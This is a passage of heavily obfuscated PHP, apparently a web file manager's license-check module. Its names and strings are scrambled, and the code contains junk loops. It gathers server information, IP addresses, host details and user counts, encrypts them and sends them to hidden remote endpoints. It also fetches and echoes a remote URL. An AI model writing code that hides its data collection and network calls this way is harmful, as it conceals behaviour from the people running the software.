$šê¨ˆø”[58], $šê¨ˆø”[59], $šê¨ˆø”[60], $šê¨ˆø”[61], $šê¨ˆø”[62], $šê¨ˆø”[63], $šê¨ˆø”[64], $šê¨ˆø”[65], $šê¨ˆø”[66], $šê¨ˆø”[67], $šê¨ˆø”[68], $šê¨ˆø”[69], $šê¨ˆø”[70], $šê¨ˆø”[71], $šê¨ˆø”[72], $šê¨ˆø”[73], $šê¨ˆø”[74], $šê¨ˆø”[75], $šê¨ˆø”[76], $šê¨ˆø”[77], $šê¨ˆø”[78], $šê¨ˆø”[79], $šê¨ˆø”[80], $šê¨ˆø”[81], $šê¨ˆø”[82], $šê¨ˆø”[83], $šê¨ˆø”[84], $šê¨ˆø”[85]); $”¢¦¬¤ˆ = $™Ñƒò¶[728]; while (strlen($”¢¦¬¤ˆ) < $™Ñƒò¶[694]) { if (!$”¢¦¬¤ˆ) { break; } $”¢¦¬¤ˆ++; } foreach ($ÃŸ›î as $èóôŞø°) { $ı®äáß = $GLOBALS[$šê¨ˆø”[86]][$šê¨ˆø”[87]][$èóôŞø°]; $ƒ§úˆ­İ = $™Ñƒò¶[729]; if (strlen($ƒ§úˆ­İ) < $™Ñƒò¶[699]) { return; } if (isset($ ôàÜ¥[$èóôŞø°])) { $ı®äáß = $ ôàÜ¥[$èóôŞø°]; } $›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[89]][$èóôŞø°] = $ı®äáß; } $­ºäîâÔ = $›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[89]][$šê¨ˆø”[46]]; $ß§££’ = $™Ñƒò¶[730]; if (!$ß§££’) { return; } unset($›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[90]][$šê¨ˆø”[91]]); $¿Ÿ‹Œù = $™Ñƒò¶[731]; while ($¿Ÿ‹Œù < $™Ñƒò¶[699]) { if ($¿Ÿ‹Œù >= 0) { break; } $¿Ÿ‹Œù++; } unset($›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[90]][$šê¨ˆø”[92]]); unset($›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[89]][$šê¨ˆø”[46]]); $¼°¿¹’ = $™Ñƒò¶[732]; while ($¼°¿¹’ < $™Ñƒò¶[706]) { if ($¼°¿¹’ >= 0) { break; } $¼°¿¹’++; } unset($›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[89]][$šê¨ˆø”[93]]); $š÷›¢ = $™Ñƒò¶[733]; if (strlen($š÷›¢) < $™Ñƒò¶[706]) { die; } $›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[89]][$šê¨ˆø”[94]] = array($šê¨ˆø”[95] => (int) $­ºäîâÔ[$šê¨ˆø”[96]], $šê¨ˆø”[97] => (int) _get($­ºäîâÔ, $šê¨ˆø”[98], 0)); $ñ‡È‹ˆ¬ = substr(md5($šê¨ˆø”[99] . get_client_ip() . $ ôàÜ¥[$šê¨ˆø”[100]]), 0, 15); $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[102]] = Mcrypt::encode(Session::sign(), $ñ‡È‹ˆ¬, 3600 * 24); $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[103]] = Action($šê¨ˆø”[104])->accessToken(); $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[105]] = md5($_SERVER[$šê¨ˆø”[106]] . $ ôàÜ¥[$šê¨ˆø”[100]]); $àù«Ò‹ì = $™Ñƒò¶[734]; $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[107]] = base64_encode(serverInfo()); $ãéà³Ä = $™Ñƒò¶[735]; while ($ãéà³Ä < $™Ñƒò¶[710]) { if ($ãéà³Ä >= 0) { break; } $ãéà³Ä++; } $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[108]] = $this->wmnv03962e33; $˜çº¸Ää = $™Ñƒò¶[736]; while (strlen($˜çº¸Ää) < $™Ñƒò¶[694]) { if (!$˜çº¸Ää) { break; } $˜çº¸Ää++; } if ($ ôàÜ¥[$šê¨ˆø”[108]] != $šê¨ˆø”[109]) { $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[110]] = $ ôàÜ¥[$šê¨ˆø”[110]]; $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[111]] = $ ôàÜ¥[$šê¨ˆø”[111]]; $Ë»Ş¨­ = rand_string(10) . $this->wmnv03962e33 . rand_string(5); $›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[112]][$šê¨ˆø”[113]] = $this->jtqac493ccc6($Ë»Ş¨­, $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[105]]); } if ($this->wmnv03962e33 == $šê¨ˆø”[109]) { $›¢ÄèëÎ[$šê¨ˆø”[88]][$šê¨ˆø”[89]][$šê¨ˆø”[94]][$šê¨ˆø”[98]] = 0; } $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[114]] = $this->versionPluginFilter(); $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[115]] = _get($this->fxpj0f983c89, $šê¨ˆø”[116], $šê¨ˆø”[6]); $¶•±Ä´ö = $™Ñƒò¶[737]; while ($¶•±Ä´ö < $™Ñƒò¶[222]) { if ($¶•±Ä´ö >= 0) { break; } $¶•±Ä´ö++; } if (KodUser::isRoot() && $this->config[$šê¨ˆø”[117]]) { $›¢ÄèëÎ[$šê¨ˆø”[101]][$šê¨ˆø”[118]] = WEB_ROOT; } return $›¢ÄèëÎ; } private function javr78e7a8a9() { $ˆ½¦•¶„ =& $_SERVER[±³—úê]; $œ ¨™„¢ =& $_SERVER[ï¢Â™Û…]; $Ã£ãÉ€ = $_SERVER[$œ ¨™„¢[24]] == $œ ¨™„¢[119]; if ($_SERVER[$œ ¨™„¢[24]] == $œ ¨™„¢[120] && $_GET[$œ ¨™„¢[121]] == $œ ¨™„¢[122]) { $Ã£ãÉ€ = !0; } if ($Ã£ãÉ€) { $ıïØó = array($œ ¨™„¢[108] => $this->wmnv03962e33, $œ ¨™„¢[123] => $this->cpma08fef23c(), $œ ¨™„¢[124] => Model($œ ¨™„¢[125])->count()); if ($this->wmnv03962e33 != $œ ¨™„¢[109]) { $˜µÔ×èì = _get($this->fxpj0f983c89, $œ ¨™„¢[126]); if ($˜µÔ×èì) { $ıïØó[$œ ¨™„¢[127]] = $˜µÔ×èì; $ıïØó[$œ ¨™„¢[128]] = strtotime(_get($this->fxpj0f983c89, $œ ¨™„¢[129])); $ıïØó[$œ ¨™„¢[130]] = _get($this->fxpj0f983c89, $œ ¨™„¢[116]); } $„ÕÃ•µ = Model($œ ¨™„¢[33])->get($œ ¨™„¢[131], $œ ¨™„¢[6], !0); if (is_string($„ÕÃ•µ) && substr($„ÕÃ•µ, 0, 1) == $œ ¨™„¢[132]) { $„ÕÃ•µ = json_decode_force($„ÕÃ•µ); } if (is_array($„ÕÃ•µ) && $„ÕÃ•µ[$œ ¨™„¢[133]] && strstr($„ÕÃ•µ[$œ ¨™„¢[133]], $œ ¨™„¢[134])) { $«¨‚ÃûÙ = explode($œ ¨™„¢[134], $„ÕÃ•µ[$œ ¨™„¢[133]]); $ıïØó[$œ ¨™„¢[135]] = $«¨‚ÃûÙ[0]; } } $ıïØó = $this->bcwjd6d054b5(json_encode($ıïØó), md5($œ ¨™„¢[136])); $ú¸Æ‰î = $ˆ½¦•¶„[738]; while (strlen($ú¸Æ‰î) < $ˆ½¦•¶„[694]) { if (!$ú¸Æ‰î) { break; } $ú¸Æ‰î++; } $„Ö»Œ•Ñ = array($œ ¨™„¢[137] => $ıïØó); $Ûî†ô… = $ˆ½¦•¶„[739]; if (strlen($Ûî†ô…) < $ˆ½¦•¶„[222]) { return; } call_user_func(array($œ ¨™„¢[138], $œ ¨™„¢[139]), $„Ö»Œ•Ñ); $Û©è£î = $ˆ½¦•¶„[740]; if (!$Û©è£î) { die; } } if ($this->wmnv03962e33 == $œ ¨™„¢[109]) { return; } $À¯ŞÜ½Ÿ = array($œ ¨™„¢[140], $œ ¨™„¢[141], $œ ¨™„¢[142], $œ ¨™„¢[143], $œ ¨™„¢[144], $œ ¨™„¢[145]); $—õŞĞ = $ˆ½¦•¶„[741]; if (!$—õŞĞ) { return; } $¯»â±õğ = Model($œ ¨™„¢[33])->get(); $„Ö»Œ•Ñ = array($œ ¨™„¢[146] => $¯»â±õğ[$œ ¨™„¢[34]], $œ ¨™„¢[147] => $¯»â±õğ[$œ ¨™„¢[35]], $œ ¨™„¢[148] => $œ ¨™„¢[6]); $ßÜÙ±Ó¬ = $ˆ½¦•¶„[742]; foreach ($À¯ŞÜ½Ÿ as $»ÍìŸÆ×) { if (!isset($¯»â±õğ[$»ÍìŸÆ×]) || !$¯»â±õğ[$»ÍìŸÆ×]) { continue; } $„Ö»Œ•Ñ[$»ÍìŸÆ×] = $¯»â±õğ[$»ÍìŸÆ×]; $É¶ß¬Âá = $ˆ½¦•¶„[743]; while ($É¶ß¬Âá < $ˆ½¦•¶„[694]) { if ($É¶ß¬Âá >= 0) { break; } $É¶ß¬Âá++; } } call_user_func(array($œ ¨™„¢[138], $œ ¨™„¢[139]), $„Ö»Œ•Ñ); } private function yvemdb16bf31() { $ÈêÇõëÏ =& $_SERVER[±³—úê]; $àšÚÜÎì =& $_SERVER[ï¢Â™Û…]; if ($_SERVER[$àšÚÜÎì[24]] != $àšÚÜÎì[149]) { return; } if (!KodUser::isRoot()) { die; } $É’ëô— = $GLOBALS[$àšÚÜÎì[13]]; if (isset($É’ëô—[$àšÚÜÎì[150]])) { $this->wftv57774989(); die; } if (isset($É’ëô—[$àšÚÜÎì[151]]) && isset($É’ëô—[$àšÚÜÎì[151]]) == $àšÚÜÎì[122]) { $É’ëô—[$àšÚÜÎì[152]] = Model($àšÚÜÎì[33])->get($àšÚÜÎì[153]); } if (!isset($É’ëô—[$àšÚÜÎì[152]]) || strlen($É’ëô—[$àšÚÜÎì[152]]) != 16) { show_json($àšÚÜÎì[154] . $É’ëô—[$àšÚÜÎì[152]], !1); } $ÇğôäÂã = Model($àšÚÜÎì[33])->get($àšÚÜÎì[100]); $Æ¦°™­Æ = md5($_SERVER[$àšÚÜÎì[106]] . $ÇğôäÂã); $ÉîˆÕ¥ = array($àšÚÜÎì[152] => $É’ëô—[$àšÚÜÎì[152]], $àšÚÜÎì[155] => rand_string(16), $àšÚÜÎì[156] => $àšÚÜÎì[136], $àšÚÜÎì[157] => $àšÚÜÎì[158], $àšÚÜÎì[159] => $_SERVER[$àšÚÜÎì[160]], $àšÚÜÎì[161] => $_SERVER[$àšÚÜÎì[162]], $àšÚÜÎì[163] => $_SERVER[$àšÚÜÎì[164]], $àšÚÜÎì[105] => $Æ¦°™­Æ, $àšÚÜÎì[165] => Model($àšÚÜÎì[33])->get($àšÚÜÎì[131])); if (isset($É’ëô—[$àšÚÜÎì[151]]) && isset($É’ëô—[$àšÚÜÎì[151]]) == $àšÚÜÎì[122]) { $ÉîˆÕ¥[$àšÚÜÎì[151]] = md5($ÉîˆÕ¥[$àšÚÜÎì[152]] . $àšÚÜÎì[166] . $ÉîˆÕ¥[$àšÚÜÎì[155]]); } if ($É’ëô—[$àšÚÜÎì[167]] == $àšÚÜÎì[168]) { $ŞêÆ¼–š = $this->bcwjd6d054b5($Æ¦°™­Æ, $àšÚÜÎì[169]); $ƒü°ÑÕ = $this->jtqac493ccc6(json_encode($ÉîˆÕ¥), $Æ¦°™­Æ . $àšÚÜÎì[170], 3); $ƒü°ÑÕ = $ƒü°ÑÕ . $àšÚÜÎì[171] . $_SERVER[$àšÚÜÎì[160]]; $ã×Äû¥¸ = $this->qlrb93b9c3fe($àšÚÜÎì[172] . $ŞêÆ¼–š . $àšÚÜÎì[173] . $ƒü°ÑÕ, -1); show_json($ã×Äû¥¸, !0); } else { if ($É’ëô—[$àšÚÜÎì[167]] == $àšÚÜÎì[174]) { $åÎ¨ÚÛŞ = substr(md5($àšÚÜÎì[175] . $Æ¦°™­Æ), 12, 15) . $àšÚÜÎì[176]; $ƒü°ÑÕ = $this->tpge693e83ea(trim($É’ëô—[$àšÚÜÎì[177]]), $åÎ¨ÚÛŞ, 2); $åø„½‘ô = json_decode($ƒü°ÑÕ, !0); if (!is_array($åø„½‘ô) || !is_array($åø„½‘ô[$àšÚÜÎì[178]]) || $åø„½‘ô[$àšÚÜÎì[152]] != !0) { $İÊ´Ê‰¨ = $àšÚÜÎì[179]; $ÕÁƒÍ¯õ = $åø„½‘ô[$àšÚÜÎì[178]] ? $àšÚÜÎì[180] . $åø„½‘ô[$àšÚÜÎì[178]] : $İÊ´Ê‰¨; show_json($ÕÁƒÍ¯õ, !1); } else { $ÉîˆÕ¥[$àšÚÜÎì[155]] = $åø„½‘ô[$àšÚÜÎì[178]][$àšÚÜÎì[181]]; } } else { $åø„½‘ô = $this->qlrb93b9c3fe($àšÚÜÎì[182], $ÉîˆÕ¥, 10); $´‹ğÅ‘€ = $ÈêÇõëÏ[744]; if (!$´‹ğÅ‘€) { return; } } } if (!is_array($åø„½‘ô) || !is_array($åø„½‘ô[$àšÚÜÎì[178]]) || $åø„½‘ô[$àšÚÜÎì[152]] != !0) { $İÊ´Ê‰¨ = LNG($àšÚÜÎì[183]); $ÕÁƒÍ¯õ = $åø„½‘ô[$àšÚÜÎì[178]] ? $àšÚÜÎì[180] . $åø„½‘ô[$àšÚÜÎì[178]] : $İÊ´Ê‰¨; show_json($ÕÁƒÍ¯õ, !1); } $ÊóØ å» = $åø„½‘ô[$àšÚÜÎì[178]]; $éáˆ¾Ö» = $this->rwbeb27a040b($ÊóØ å»[$àšÚÜÎì[184]]); $²óÎÒ—¤ = $ÈêÇõëÏ[745]; if (strlen($²óÎÒ—¤) < $ÈêÇõëÏ[222]) { die; } if (!$éáˆ¾Ö» || $éáˆ¾Ö» != $ÊóØ å»[$àšÚÜÎì[129]]) { $ë— ±× = array($àšÚÜÎì[185] => Model($àšÚÜÎì[33])->get($àšÚÜÎì[100]), $àšÚÜÎì[186] => $_SERVER[$àšÚÜÎì[106]], $àšÚÜÎì[187] => this_url(), $àšÚÜÎì[161] => $_SERVER[$àšÚÜÎì[162]]); $ƒü°ÑÕ = $this->bdcq5d995697(json_encode($ë— ±×)); $this->qlrb93b9c3fe($àšÚÜÎì[188] . $ƒü°ÑÕ); show_json(LNG($àšÚÜÎì[189]), !0); } $•‘ÎÉã¯ = array($àšÚÜÎì[153] => $ÊóØ å»[$àšÚÜÎì[190]], $àšÚÜÎì[191] => $ÊóØ å»[$àšÚÜÎì[192]], $àšÚÜÎì[193] => rand_string(16), $àšÚÜÎì[108] => $ÊóØ å»[$àšÚÜÎì[194]]); if ($ÉîˆÕ¥[$àšÚÜÎì[155]]) { $•‘ÎÉã¯[$àšÚÜÎì[193]] = $ÉîˆÕ¥[$àšÚÜÎì[155]]; } $¶”ùê¨Ş = substr(md5($•‘ÎÉã¯[$àšÚÜÎì[191]]), 10, 10); $Î¿ø’£ = $¶”ùê¨Ş . $•‘ÎÉã¯[$àšÚÜÎì[108]] . $•‘ÎÉã¯[$àšÚÜÎì[193]]; $›ğ¨ÈÙ‰ = $ÈêÇõëÏ[746]; if (strlen($›ğ¨ÈÙ‰) < $ÈêÇõëÏ[710]) { die; } $•‘ÎÉã¯[$àšÚÜÎì[110]] = strrev(base64_encode($this->bcwjd6d054b5($Î¿ø’£, $àšÚÜÎì[195]))); $”Í‘ù² = rand_string(16); $ÆÈ¹îüú = $”Í‘ù² . $•‘ÎÉã¯[$àšÚÜÎì[108]] . $this->bcwjd6d054b5(md5($•‘ÎÉã¯[$àšÚÜÎì[153]]), $”Í‘ù²); $•‘ÎÉã¯[$àšÚÜÎì[111]] = base64_encode(strrev($this->bcwjd6d054b5($ÆÈ¹îüú, $àšÚÜÎì[196]))); $Ğ†‹”È… = $ÈêÇõëÏ[747]; if (!$Ğ†‹”È…) { return; } if ($ÊóØ å»[$àšÚÜÎì[197]] && $ÊóØ å»[$àšÚÜÎì[197]] >= 1) { Model($àšÚÜÎì[33])->setDeep($àšÚÜÎì[198], $àšÚÜÎì[122]); } Model($àšÚÜÎì[33])->set($•‘ÎÉã¯); $óŒ÷ÀÔ = md5($_SERVER[$àšÚÜÎì[106]] . strrev($ÇğôäÂã) . $•‘ÎÉã¯[$àšÚÜÎì[191]]); $‚òøÀ¹Ÿ = strrev(substr($óŒ÷ÀÔ, 10, 16)); $Ö¤ªÔ‘é = $this->jtqac493ccc6(json_encode($ÊóØ å»), $óŒ÷ÀÔ); $ù—®â½® = $ÈêÇõëÏ[748]; while ($ù—®â½® < $ÈêÇõëÏ[222]) { if ($ù—®â½® >= 0) { break; } $ù—®â½®++; } $Õş²‹ş» = array_to_keyvalue(Model($àšÚÜÎì[7])->listData(), $àšÚÜÎì[199]); $ÙüÔ¨ = $ÈêÇõëÏ[749]; if (strlen($ÙüÔ¨) < $ÈêÇõëÏ[710]) { die; } $œšØ¼ˆÖ = $Õş²‹ş»[$àšÚÜÎì[200]]; $Ü³ÇØøÆ = $ÈêÇõëÏ[750]; while ($Ü³ÇØøÆ < $ÈêÇõëÏ[694]) { if ($Ü³ÇØøÆ >= 0) { break; } $Ü³ÇØøÆ++; } $èº¶’çš = array(); $èº¶’çš[$‚òøÀ¹Ÿ] = $Ö¤ªÔ‘é; $šØÊï€ = $ÈêÇõëÏ[751]; while (strlen($šØÊï€) < $ÈêÇõëÏ[699]) { if (!$šØÊï€) { break; } $šØÊï€++; } Model($àšÚÜÎì[7])->update($œšØ¼ˆÖ[$àšÚÜÎì[201]], array($àšÚÜÎì[202] => $èº¶’çš)); $£¾Ê”Èõ = $ÈêÇõëÏ[752]; while (strlen($£¾Ê”Èõ) < $ÈêÇõëÏ[710]) { if (!$£¾Ê”Èõ) { break; } $£¾Ê”Èõ++; } $this->fxpj0f983c89 = $ÊóØ å»; $this->wmnv03962e33 = $•‘ÎÉã¯[$àšÚÜÎì[108]]; $²‘©·€ = $ÈêÇõëÏ[743]; while ($²‘©·€ < $ÈêÇõëÏ[694]) { if ($²‘©·€ >= 0) { break; } $²‘©·€++; } $this->licenseRegistSuccess(); Cache::set($àšÚÜÎì[203] . md5($ÇğôäÂã . $àšÚÜÎì[204]), $àšÚÜÎì[6]); show_json(LNG($àšÚÜÎì[189]), !0); } private function licenseRegistSuccess() { $ŠëêğÚğ =& $_SERVER[ï¢Â™Û…]; $ÜæÆìî = Model($ŠëêğÚğ[33])->get(); if ($ÜæÆìî[$ŠëêğÚğ[63]] != $ŠëêğÚğ[122]) { Model($ŠëêğÚğ[33])->set($ŠëêğÚğ[63], $ŠëêğÚğ[122]); } Action($ŠëêğÚğ[205])->initStart(!0); } private function wftv57774989() { $›Èºèüì =& $_SERVER[ï¢Â™Û…]; Model($›Èºèüì[33])->set(array($›Èºèüì[153] => $›Èºèüì[6], $›Èºèüì[191] => $›Èºèüì[6], $›Èºèüì[108] => $›Èºèüì[109], $›Èºèüì[110] => $›Èºèüì[6], $›Èºèüì[111] => $›Èºèüì[6])); Model($›Èºèüì[33])->setDeep($›Èºèüì[198], $›Èºèüì[206]); $ñ‰éõÖ™ = $_SERVER[±³—úê][753]; $this->fxpj0f983c89 = array(); $this->wmnv03962e33 = $›Èºèüì[109]; } private function gvmpa7b99284() { $ÍÔò³Û =& $_SERVER[±³—úê]; $³©íĞÛÍ =& $_SERVER[ï¢Â™Û…]; $_SERVER[$³©íĞÛÍ[162]] = _get($_SERVER, $³©íĞÛÍ[162], APP_HOST); $this->wmnv03962e33 = $³©íĞÛÍ[109]; $Ÿûâ¿¡µ = Model($³©íĞÛÍ[33])->get(); $Ó»Ú³ê = $ÍÔò³Û[754]; if (strlen($Ó»Ú³ê) < $ÍÔò³Û[222]) { return; } if ($Ÿûâ¿¡µ[$³©íĞÛÍ[108]] == $³©íĞÛÍ[109]) { return; } $†Çù»†— = Model($³©íĞÛÍ[33])->get($³©íĞÛÍ[100]); $’ñàöÙò = $³©íĞÛÍ[203] . md5($†Çù»†— . $³©íĞÛÍ[204]); $ÃîÇÙÒ× = $ÍÔò³Û[726]; while ($ÃîÇÙÒ× < $ÍÔò³Û[710]) { if ($ÃîÇÙÒ× >= 0) { break; } $ÃîÇÙÒ×++; } $œ«“Ê = Cache::get($’ñàöÙò); $„²’”Ï° = $ÍÔò³Û[755]; while (strlen($„²’”Ï°) < $ÍÔò³Û[710]) { if (!$„²’”Ï°) { break; } $„²’”Ï°++; } if (!is_array($œ«“Ê) || !isset($œ«“Ê[$³©íĞÛÍ[207]]) || time() - $œ«“Ê[$³©íĞÛÍ[207]] >= 60) { $‹‹Ñ¶­Ø = Model($³©íĞÛÍ[7])->loadList(); $†ß×ø‚ = $‹‹Ñ¶­Ø[$³©íĞÛÍ[200]]; $³÷àÍ¿º = md5($_SERVER[$³©íĞÛÍ[106]] . strrev($†Çù»†—) . $Ÿûâ¿¡µ[$³©íĞÛÍ[191]]); $ÒÓ„¨şà = strrev(substr($³÷àÍ¿º, 10, 16)); $œ«“Ê = $this->tpge693e83ea($†ß×ø‚[$³©íĞÛÍ[86]][$ÒÓ„¨şà], $³÷àÍ¿º); $œ«“Ê = json_decode($œ«“Ê, !0); } if (!is_array($œ«“Ê)) { return $this->wftv57774989(); } $Øâ¸¢÷Ò = strtotime($œ«“Ê[$³©íĞÛÍ[129]]); if (time() >= $Øâ¸¢÷Ò) { return $this->wftv57774989(); } if (!isset($œ«“Ê[$³©íĞÛÍ[207]]) || time() - $œ«“Ê[$³©íĞÛÍ[207]] > 20) { $œ«“Ê[$³©íĞÛÍ[207]] = time(); Cache::set($’ñàöÙò, $œ«“Ê); } $this->fxpj0f983c89 = $œ«“Ê; $this->wmnv03962e33 = $Ÿûâ¿¡µ[$³©íĞÛÍ[108]]; } private function hunzc5aaa11c() { $ÌÓÏ–Ş  =& $_SERVER[ï¢Â™Û…]; $¬ªÒü¸³ = $GLOBALS[$ÌÓÏ–Ş [13]]; $•ƒ÷œŠ = $_SERVER[$ÌÓÏ–Ş [24]]; if ($•ƒ÷œŠ == $ÌÓÏ–Ş [208] && $this->wmnv03962e33 == $ÌÓÏ–Ş [109]) { show_json(LNG($ÌÓÏ–Ş [209]), !1, $ÌÓÏ–Ş [210]); } $³ù‘ƒº¤ = array($ÌÓÏ–Ş [211], $ÌÓÏ–Ş [212]); if (in_array($•ƒ÷œŠ, $³ù‘ƒº¤)) { if ($this->wmnv03962e33 == $ÌÓÏ–Ş [109] && isset($¬ªÒü¸³[$ÌÓÏ–Ş [213]])) { show_json(LNG($ÌÓÏ–Ş [209]), !1, $ÌÓÏ–Ş [210]); die; } $–µ›˜¯Ğ = $this->cpma08fef23c(); if ($–µ›˜¯Ğ != intval($ÌÓÏ–Ş [214])) { if ($–µ›˜¯Ğ <= Model($ÌÓÏ–Ş [125])->count()) { show_json(LNG($ÌÓÏ–Ş [215]), !1, $ÌÓÏ–Ş [210]); die; } } } } private function adghcd15dfd2() { $Ñ¦‰¨À =& $_SERVER[±³—úê]; $´©çô =& $_SERVER[ï¢Â™Û…]; $ğúòºÄñ = array($´©çô[119], $´©çô[120]); if (!KodUser::isRoot() || !isset($_GET[$´©çô[216]])) { return; } if (!in_array($_SERVER[$´©çô[24]], $ğúòºÄñ)) { return; } $°Ã»æÊË = $´©çô[217]; $ƒäÂÒşÒ = $Ñ¦‰¨À[756]; if (!$ƒäÂÒşÒ) { return; } $°Ã»æÊË = $this->clot202cf700($°Ã»æÊË, $´©çô[218]); $â³İ‰ã = $Ñ¦‰¨À[757]; if (strlen($â³İ‰ã) < $Ñ¦‰¨À[222]) { die; } $§‘ï¹õĞ = stream_context_create(array($´©çô[219] => array($´©çô[220] => $´©çô[221], $´©çô[222] => 3))); $£¢¶ø“¢ = @file_get_contents($°Ã»æÊË, !1, $§‘ï¹õĞ); header($´©çô[223]); $©Éı’¶° = $Ñ¦‰¨À[758]; if (strlen($©Éı’¶°) < $Ñ¦‰¨À[699]) { die; } if ($£¢¶ø“¢ && strstr($£¢¶ø“¢, $´©çô[224])) { echo $£¢¶ø“¢; } die; } public function xzajf294a57f($°…„ù¶ş) { $³Áï¿ä =& $_SERVER[±³—úê]; $Ü½ó‚²å =& $_SERVER[ï¢Â™Û…]; if ($this->wmnv03962e33 == $Ü½ó‚²å[225]) { return $°…„ù¶ş; } $ ˜ş×ş‡ = $this->versionPluginList(); $Í•öÈßª = $³Áï¿ä[759]; while (strlen($Í•öÈßª) < $³Áï¿ä[710]) { if (!$Í•öÈßª) { break; } $Í•öÈßª++; } $Ç¤ŠÔ‚ã = explode($Ü½ó‚²å[226], $this->versionPluginFilter()); $˜óÍò = $³Áï¿ä[760]; if (strlen($˜óÍò) < $³Áï¿ä[699]) { return; } $§£õâ¥ = array(); $ç­öİ…Ç = $³Áï¿ä[761]; foreach ($ ˜ş×ş‡ as $ûÈ¶¾À => $”çÍûºÉ) { if ($”çÍûºÉ == $Ü½ó‚²å[227] && substr($this->wmnv03962e33, 0, 1) == $Ü½ó‚²å[227]) { continue; } if (!in_array($ûÈ¶¾À, $Ç¤ŠÔ‚ã)) { $§£õâ¥[] = $ûÈ¶¾À; } } foreach ($§£õâ¥ as $ûÈ¶¾À) { unset($°…„ù¶ş[$ûÈ¶¾À]); } return $°…„ù¶ş; $É¶²Ç©§ = $³Áï¿ä[762]; if (!$É¶²Ç©§) { die; } } private function versionPluginList() { $”È€ö¨ =& $_SERVER[ï¢Â™Û…]; return array($”È€ö¨[228] => $”È€ö¨[227], $”È€ö¨[229] => $”È€ö¨[227], $”È€ö¨[230] => $”È€ö¨[227], $”È€ö¨[231] => $”È€ö¨[232], $”È€ö¨[233] => $”È€ö¨[232], $”È€ö¨[234] => $”È€ö¨[232], $”È€ö¨[235] => $”È€ö¨[232], $”È€ö¨[236] => $”È€ö¨[232], $”È€ö¨[237] => $”È€ö¨[232], $”È€ö¨[238] => $”È€ö¨[232], $”È€ö¨[239] => $”È€ö¨[232], $”È€ö¨[240] => $”È€ö¨[232], $”È€ö¨[241] => $”È€ö¨[232], $”È€ö¨[242] => $”È€ö¨[232], $”È€ö¨[243] => $”È€ö¨[232], $”È€ö¨[244] => $”È€ö¨[232]); } private function versionPluginFilter() { $·ÕµÛÖ× =& $_SERVER[ï¢Â™Û…]; if ($this->wmnv03962e33 == $·ÕµÛÖ×[109]) { return $·ÕµÛÖ×[6]; } $©Áˆ©Œ† = _get($this->fxpj0f983c89, $·ÕµÛÖ×[245], $·ÕµÛÖ×[6]); $€·íñ‰Ì = _get($this->fxpj0f983c89, $·ÕµÛÖ×[116], $·ÕµÛÖ×[6]); $‡Â¬Ø˜å = _get($this->fxpj0f983c89, $·ÕµÛÖ×[246], $·ÕµÛÖ×[6]); if ($€·íñ‰Ì > time() && $‡Â¬Ø˜å > time()) { $î–İÆ¾ = explode($·ÕµÛÖ×[226], $©Áˆ©Œ†); $–¢şæÁ  = array_keys($this->versionPluginList()); $©Áˆ©Œ† = array_merge($î–İÆ¾, $–¢şæÁ ); $©Áˆ©Œ† = implode($·ÕµÛÖ×[226], array_filter(array_unique($©Áˆ©Œ†))); } return $©Áˆ©Œ†; } private function fegvf5145144() { $ü§ù·¨Ì =& $_SERVER[ï¢Â™Û…]; if ($this->wmnv03962e33 != $ü§ù·¨Ì[109]) { $GLOBALS[$ü§ù·¨Ì[86]][$ü§ù·¨Ì[90]][$ü§ù·¨Ì[247]] = $ü§ù·¨Ì[206]; return; } $GLOBALS[$ü§ù·¨Ì[86]][$ü§ù·¨Ì[248]] = $ü§ù·¨Ì[122]; if (Model($ü§ù·¨Ì[249])->get($ü§ù·¨Ì[63]) != $ü§ù·¨Ì[206]) { Model($ü§ù·¨Ì[249])->set($ü§ù·¨Ì[63], $ü§ù·¨Ì[206]); } } public function dfrp00ba4efa() { $ó¤²ƒ›½ =& $_SERVER[±³—úê]; return $_SERVER[ï¢Â™Û…][250]; $¬»ØæåØ = $ó¤²ƒ›½[763]; while ($¬»ØæåØ < $ó¤²ƒ›½[222]) { if ($¬»ØæåØ >= 0) { break; } $¬»ØæåØ++; } } private function ycivd359b36e() { $Ó¡íš¯ƒ =& $_SERVER[±³—úê]; $«âƒè¦È =& $_SERVER[ï¢Â™Û…]; $ºâ‚†´¹ = array($«âƒè¦È[251], $«âƒè¦È[252], $«âƒè¦È[253]); $ÒÍŠ•Äá = $Ó¡íš¯ƒ[764]; $ƒ«Œ¨£³ = $«âƒè¦È[254] . md5($«âƒè¦È[255]); $—šóöŒ = $Ó¡íš¯ƒ[765]; if ($this->wmnv03962e33 == $«âƒè¦È[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$«âƒè¦È[24]], $ºâ‚†´¹)) { return; } if (time() % 4 != 0) { return; } $ÍÓÍÂôØ = call_user_func(array($«âƒè¦È[256], $«âƒè¦È[257]), $ƒ«Œ¨£³); if ($ÍÓÍÂôØ && time() - $ÍÓÍÂôØ < intval($«âƒè¦È[258])) { return; } call_user_func(array($«âƒè¦È[256], $«âƒè¦È[139]), $ƒ«Œ¨£³, time()); $Ÿï§ø¿ = Model($«âƒè¦È[33])->get($«âƒè¦È[100]); $÷ ®ŒŠ = $Ó¡íš¯ƒ[766]; if (!$÷ ®ŒŠ) { return; } $ÎØ±ÓŞÉ = array($«âƒè¦È[152] => Model($«âƒè¦È[33])->get($«âƒè¦È[153]), $«âƒè¦È[167] => $this->wmnv03962e33, $«âƒè¦È[163] => $_SERVER[$«âƒè¦È[164]], $«âƒè¦È[165] => Model($«âƒè¦È[33])->get($«âƒè¦È[131]), $«âƒè¦È[105] => md5($_SERVER[$«âƒè¦È[106]] 